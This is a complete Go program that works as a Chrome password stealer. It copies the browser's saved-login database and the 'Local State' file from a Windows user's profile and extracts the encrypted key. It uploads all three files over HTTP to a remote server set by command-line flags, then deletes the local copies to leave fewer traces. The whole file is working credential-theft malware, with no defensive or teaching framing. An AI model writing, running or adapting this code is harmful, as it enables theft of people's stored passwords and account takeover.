package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

var port int
var address string

var ghais int

func check(err error) {
	if err != nil {
		fmt.Printf("Error : %s", err.Error())
		os.Exit(1)
	}
}

func getEncryptedKey() string {
	usr, _ := user.Current()
	keyPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
	srcFile, err := os.Open(keyPath)
	check(err)
	defer srcFile.Close()

	destFile, err := os.Create("local_state.json")
	_, err = io.Copy(destFile, srcFile)
	check(err)
	destFile.Close()

	data, err := ioutil.ReadFile("local_state.json")
	if err != nil {
		log.Fatal(err)
	}

	r := regexp.MustCompile(`"encrypted_key"\s*:\s*"([^"]*)"`)
	matches := r.FindStringSubmatch(string(data))

	if len(matches) < 2 {
		log.Fatal("No encrypted_key found in the file")
	}

	return matches[1]
}

func saveStringToFile(str string) {
	f, err := os.Create("./encryption_key")
	check(err)

	defer f.Close()

	_, err = f.WriteString(str)
	check(err)
}

func sendFile(filename string, wg *sync.WaitGroup) {
	defer wg.Done()

	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	defer file.Close()

	var requestBody bytes.Buffer

	multiPartWriter := multipart.NewWriter(&requestBody)

	fileWriter, err := multiPartWriter.CreateFormFile("file", filepath.Base(file.Name()))
	if err != nil {
		log.Fatalf("Error adding file to request: %v", err)
	}

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		log.Fatalf("Error copying file to request: %v", err)
	}

	multiPartWriter.Close()

	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s:%v/upload", address, port), &requestBody)
	if err != nil {
		log.Fatalf("Error creating request: %v", err)
	}

	req.Header.Add("Content-Type", multiPartWriter.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error sending request: %v", err)
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error reading response body: %v", err)
	}

	fmt.Printf("Response: %s\n", body)

}

func main() {
	flag.IntVar(&port, "p", 8080, "Provide a port number")
	flag.StringVar(&address, "a", "localhost", "Provide an ip address")
	flag.Parse()

	usr, _ := user.Current()
	dbPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data")
	srcFile, err := os.Open(dbPath)
	check(err)
	defer srcFile.Close()

	destFile, err := os.Create("login_data")
	check(err)

	_, err = io.Copy(destFile, srcFile)
	check(err)
	destFile.Close()

	encryptedKey := getEncryptedKey()
	saveStringToFile(encryptedKey)

	fmt.Println("Script started")
	var wg sync.WaitGroup

	filenames := []string{"local_state.json", "login_data", "encryption_key"}
	for _, filename := range filenames {
		wg.Add(1)
		go sendFile(filename, &wg)
	}

	wg.Wait()

	for _, filename := range filenames {
		err := os.Remove(filename)
		if err != nil {
			log.Fatalf("Error deleting file: %v", err)
		}

		fmt.Printf("Deleted file: %s\n", filename)
	}
}
